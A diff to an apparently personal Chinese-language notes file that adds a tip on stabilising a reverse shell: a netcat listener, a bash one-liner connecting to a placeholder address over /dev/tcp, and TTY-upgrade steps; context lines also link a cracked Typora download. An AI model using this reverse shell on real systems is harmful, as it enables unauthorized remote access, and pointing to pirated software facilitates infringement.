@@ -394,6 +394,15 @@ find . -maxdepth 1 -mindepth 1 -name "*.html" -exec sed -i 's/http:\/\/www.a.tes
 ## typora windows破解版
 <https://www.fahai.org/index.php/archives/166/>
 
+## 反弹shell显示优化
+- 服务端监听`nc -lv 8888`
+- 客户端反弹`bash -i >& /dev/tcp/x.x.x.x/8888 0>&1`
+- 服务端执行`ctrl+z`把`nc`放进后台
+- 服务端执行`stty raw -echo`
+- 服务端执行`fg + [Enter x 2]`
+- 服务端执行`script /dev/null && exit`
+- 服务端执行`reset`
+
 # 系统
 
 ## 编写独立内核模块
